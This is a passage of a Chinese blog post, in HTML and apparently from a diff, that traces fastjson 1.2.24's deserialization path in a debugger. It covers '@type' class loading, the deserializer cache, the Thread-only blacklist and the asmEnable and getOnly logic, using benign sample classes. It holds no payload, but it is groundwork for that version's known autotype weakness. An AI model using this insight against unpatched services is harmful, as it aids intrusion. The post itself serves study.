href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>FastJSON 在序列化时，利用 Java 的反射机制，通过调用 JavaBean 的 <code>getter</code> 方法获取属性值。</p>
+<p>在反序列化时，FastJSON 通过无参构造方法创建对象，并利用 <code>setter</code> 方法设置属性值 </p>
+<h1 id="基础流程分析"><a href="#基础流程分析" class="headerlink" title="基础流程分析"></a>基础流程分析</h1><p>JSONObject是一个Map类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUnser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//使用 fastjson 的 JSON.parseObject 方法将JSON字符串 s 解析为一个 JSONObject 对象</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">        System.out.println(jsonObject.get(<span class="string">&quot;param1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过上述代码可以初步了解到fastjson的作用</p>
+<p>Person类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUnser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(s, Person.class);</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述的代码把json字符串解析为了一个java对象，然后我们还可以正常调用它的方法，在这个过程中调用了哪些方法，如下所示：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214105142574.png" alt="image-20250214105142574"></p>
+<p>可以看到除了最后我们自己调用的getName方法外，系统会自动调用setter方法给对象进行赋值</p>
+<p>再来一个例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUnser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//通过@type字段指定一个类，让字符串根据它来进行解析</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot; : \&quot;org.example.Person\&quot;, \&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214110123660.png" alt="image-20250214110123660"></p>
+<p>从结果我们可以看出来，在这个过程中自动调用了构造方法，还有setter和getter方法来进行赋值和输出</p>
+<p>上述代码通过我们输入的类的不同而会调用相对应的方法，这就是fastjson的一个功能</p>
+<p>接下来我们来调试一下，探究这个过程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214110730026.png" alt="image-20250214110730026"></p>
+<p>跟进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214201559789.png" alt="image-20250214201559789"></p>
+<p>我们再继续跟进parse方法中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214202001712.png" alt="image-20250214202001712"></p>
+<p><code>DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</code></p>
+<p>这段代码创建了一个 <code>DefaultJSONParser</code> 对象，用于解析 JSON 字符串。<code>DefaultJSONParser</code> 是 <code>fastjson</code> 库中的一个核心类，负责将 JSON 字符串解析为 Java 对象</p>
+<p>PS：对于token的初始化可以来到defaultJSONparser的构造函数来看</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026024435951.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20241026024435951.png" alt="img"></a></p>
+<p>往下走到<code>Object value = parser.parse();</code>，开始进行解析字符串，跟进去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.parse((Object)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进去，该方法会对JSON字符串中的每一个字符都进行解析，如第一次就是对<code>&#123;</code>进行解析</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214202622519.png" alt="image-20250214202622519"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));</span><br></pre></td></tr></table></figure>
+
+<p>没有传入lexer本身，或者是任何和我们json字符串内容相关的，断定反序列化还没进行，创建一个空的object用来后续装载生成的JSONObject对象</p>
+<p>在下一行return代码中会调用接收Map的parseObject方法，这是最重要的地方，我们跟进去</p>
+<p>一直往下走到这里</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214203801240.png" alt="image-20250214203801240"></p>
+<p>该处代码用来跳过任意个逗号，不重要</p>
+<p>往下走定义了一个key变量，用于存放json中的键名</p>
+<p>if做判断，当前是双引号，于是进行操作读取两个双引号之间的内容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214204259038.png" alt="image-20250214204259038"></p>
+<p>获取到key之后向下走，来到了对key的判断</p>
+<p>这里把代码块收起来方便做一个宏观的分析</p>
+<p>如果key的值是<code>@type</code>，即我们当前的情况</p>
+<p>走进第一个if代码块</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214204633573.png" alt="image-20250214204633573"></p>
+<p>展开分析可以发现有一行代码中有loadClass，跟进去看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214204809349.png" alt="image-20250214204809349"></p>
+<p>首先会从mappings缓存中查找class，找到了就直接返回了</p>
+<p>没找到的话先根据className进行类特殊性检验，如<code>[</code>开头就意味着是数组类，则返回Array对象，如果是L开头;结尾的类数组写法，则去掉首位，再调用loadClass（forName支持对数组的类加载loadClass不支持）</p>
+<p>之后就是简单的调AppClassLoader在本地加载类，加入缓存，返回</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214205359100.png" alt="image-20250214205359100"></p>
+<p>继续往下跟，来到这个地方，</p>
+<p>出现了我们一开始传入的空的object，</p>
+<p>实际上每一轮循环加载完一对key和value就会往object内存入</p>
+<p>第一轮尚未结束，没存入任何的东西所以这里还是暂时跳过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026032435763.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20241026032435763.png" alt="img"></a></p>
+<p>下方来到最关键的一部分</p>
+<p>是真正开始fastjson反序列化流程的一部分</p>
+<p>从config中获取一个反序列化器，紧接着通过这个反序列化器进行反序列化</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214205706924.png" alt="image-20250214205706924"></p>
+<p>我们跟进去看反序列化器是怎么获取到的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214210347606.png" alt="image-20250214210347606"></p>
+<p>先从缓存表中获取derializer</p>
+<p>ps：在ParseConfig的构造函数中将许多内置类put进了缓存中，但是显然我们这个Person类是不在的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214210554092.png" alt="image-20250214210554092"></p>
+<p>我们继续往下走，走到下面这步时跟进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214210652313.png" alt="image-20250214210652313"></p>
+<p>往下走，来到一处代码块，若在被序列化的类上面使用了@JSONType注解，则会走进这里面的获取反序列化器的逻辑进行操作</p>
+<p>等于说是用户自定义了一个反序列化器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214210810735.png" alt="image-20250214210810735"></p>
+<p>继续往下走到一处黑名单，仅仅是禁了一个Thread类而已</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214211047139.png" alt="image-20250214211047139"></p>
+<p>继续往下走</p>
+<p>之后便是一堆的判断，判断类是否为某个包下的然后对应进行处理</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026034828118.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026034828118.png" alt="img"></a></p>
+<p>一路skip过去，来到了创建JavaBeanDeserializer，顾名思义，应该是生成一个JavaBean的反序列化解析器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214211355977.png" alt="image-20250214211355977"></p>
+<p>我们跟进去，开头定义了asmEnable的值默认为true</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214211609179.png" alt="image-20250214211609179"></p>
+<p>继续往下看，几种情况下asmEnable会变为false</p>
+<p>父类标识符为非public</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026035502046.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026035502046.png" alt="img"></a></p>
+<p>泛型类型参数不为0</p>
+<p>（如<code>UserImpl&lt;T,U&gt;</code>的返回结果就是2，<code>UserImpl&lt;T&gt;</code>的返回结果就是1）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026035859454.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026035859454.png" alt="img"></a></p>
+<p>class是否使用ExtClassLoader类加载器</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026040052389.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026040052389.png" alt="img"></a></p>
+<p>这里稍微进isExternal分析一下</p>
+<p>while循环一轮过后，current为ASMClassLoader的父类加载器，即AppClassLoader</p>
+<p>假如说这里的clazz的类加载器classLoader是ExtClassLoader，为拓展库的类，则会返回true</p>
+<p>但是UserImpl显然是应用程序的类，其类加载器也应为AppClassLoader</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026040516906.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://blog.potatowo.top/2024/10/24/fastjson/image-20241026040516906.png" alt="img"></a></p>
+<p>出来后继续往下走，发现还有一部分的能让asmClassLoader为false的地方</p>
+<p>比较简单就不一一列举了</p>
+<p>继续往下走，有一行JavaBeanInfo.build()方法的调用，主要就是返回bean的一些属性包括属性名，方法名，getter，setter等</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214212037925.png" alt="image-20250214212037925"></p>
+<p>我们跟进去，首先获取类的属性，public的方法，构造方法等</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214212448843.png" alt="image-20250214212448843"></p>
+<p>313行开始，将for代码块收起来，宏观上分为三部分</p>
+<p>第一部分，遍历所有的public方法，目的是为了获取你的所有字段</p>
+<p>第二部分，遍历所有public的属性，上面我们的Person类属性都是private的，所以相当于没有</p>
+<p>第三部分，再次遍历所有的public方法</p>
+<p>（实际上第一次遍历是调所有的setter，第二次遍历是调所有的getter）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214212827825.png" alt="image-20250214212827825"></p>
+<p>ok，我们先进入第一个for循环中</p>
+<p>先进行判断：方法名长度是否大于4，是否是静态方法以及返回值是否为Void或者Person类本身</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214214043723.png" alt="image-20250214214043723"></p>
+<p>最开始是getName，不满则条件，跳过</p>
+<p>直到setName方法时，进入if从句</p>
+<p>往下走规定方法要以set开头才能进入if从句中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214214744903.png" alt="image-20250214214744903"></p>
+<p>继续往下走，将setter对应的property全部字符转小写，Name变为name</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214214846617.png" alt="image-20250214214846617"></p>
+<p>往后一直走，通过setter操作遍历完field过后，将结果保存到fieldList</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214215553265.png" alt="image-20250214215553265"></p>
+<p>跟进FieldInfo，库库步过，直到下面这个比较重要的变量getOnly</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250214215731662.png" alt="image-20250214215731662"></p>
+<p>这里先不赘述了，先埋一个伏笔</p>
+<p>add方法就是将结果放到fieldList中</p>
+<p>setter都遍历完之后，开始遍历所有的public字段</p>
+<p>对field的遍历过程比较简单，不做详细描述了</p>
+<p>往下到getter的遍历，前面的if判断和setter遍历是相似的，直到这一部分if判断代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())</span><br></pre></td></tr></table></figure>
+
+<p>只有当getter的返回值满足这个if中的Collection、Map等，才能进入到代码中走到最后的add</p>
+<p>也就是说才能被当做一个property被加入到fieldList中</p>
+<p>同时还需要满足fieldList中不包含这个字段，也就是说要是前面seteer方法将某个字段加入了fieldList中后，就不会再通过getter方法加入了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216160539589.png" alt="image-20250216160539589"></p>
+<p>在这里我们肯定都是不满足的，所以都会跳过，走到最后一行return的代码处，将前面遍历的字段还有方法之类的封装起来</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216160857097.png" alt="image-20250216160857097"></p>
+<p>走出来后，能在beanInfo中看到刚刚封装好的字段</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216161140301.png" alt="image-20250216161140301"></p>
+<p>在下面一部分代码中还有好几种方法可以使得asmEnable的值为false</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216161513475.png" alt="image-20250216161513475"></p>
+<p>上面多次提到asmEnble这个开关，那么它的作用究竟是什么呢</p>
+<p>往下走之后，紧接着就走到一个if判断</p>
+<p>如果asmEnable是默认的true的话，那么不会走到new JavaBeanDeserializer，而是会返回一个asmFactory的创建反序列化器的方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216162435552.png" alt="image-20250216162435552"></p>
+<p>返回后我们可以看到反序列化器是成功创建了出来</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216162627119.png" alt="image-20250216162627119"></p>
+<p>但是这样的类有什么不好的地方呢，就是临时创建的类在调试过程中发现根本不清楚这个过程做了什么，调用栈上虽然有，但是点击并没有任何的反应</p>
+<p>因此如果想要调试我们只能让asmEnable为false，然后new JavaBeanDeserializer来创建一个反序列化器</p>
+<p>在上面的伏笔中中，存在通过判断字段是否getOnly来关闭asmEnable</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216163527235.png" alt="image-20250216163527235"></p>
